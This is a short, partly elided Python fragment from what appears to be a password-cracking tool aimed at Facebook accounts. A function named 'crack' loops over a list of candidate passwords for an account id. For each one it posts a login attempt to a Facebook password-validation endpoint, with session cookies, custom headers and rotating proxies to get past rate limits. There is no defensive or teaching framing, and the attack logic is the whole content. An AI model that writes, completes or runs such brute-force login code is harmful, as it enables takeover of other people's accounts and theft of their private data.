...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			heade={'authority': 'b-api.facebook.com',
			...
			po = ses.post('https://b-api.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
